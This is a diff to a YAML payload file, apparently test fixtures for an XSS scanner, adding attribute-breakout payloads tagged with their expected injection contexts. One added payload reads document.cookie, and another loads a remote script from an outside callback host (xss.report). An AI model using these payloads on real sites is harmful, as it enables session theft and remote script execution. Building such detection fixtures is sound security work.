@@ -36,6 +36,24 @@ xss:
   - value: "\"><img src=x onerror=alert(1)>"
     expected_context: html
     expected_subcontext: attribute
+  - value: "\"><svg/onload=alert(1)>"
+    expected_context: attribute
+    expected_subcontext: attribute
+  - value: "'><svg/onload=alert(1)>"
+    expected_context: attribute
+    expected_subcontext: attribute
+  - value: "'\"><svg/onload=alert(1)>"
+    expected_context: attribute
+    expected_subcontext: attribute
+  - value: "'><svg/onload=alert(document.cookie)>"
+    expected_context: attribute
+    expected_subcontext: attribute
+  - value: "'\"> <details open ontoggle=alert(1)>"
+    expected_context: html
+    expected_subcontext: attribute
+  - value: "'\"> <svg/onload=alert(1)>"
+    expected_context: html
+    expected_subcontext: attribute
   - value: "\" autofocus onfocus=alert(1) x=\""
     expected_context: attribute
   - value: "\" onmouseover=alert(1) \""
@@ -93,3 +111,11 @@ execution:
     requires: ["onload"]
   - value: "<script>console.log('XSS_EXEC')</script>"
     expected_context: html
+  - value: "'\"><script src=https://xss.report/c/drpece></script>"
+    expected_context: html
+    expected_subcontext: attribute
+    breaks_out_of: quoted_attribute
+    loads_external_script: true
+    requires:
+      - html_injection
+      - no_strict_csp
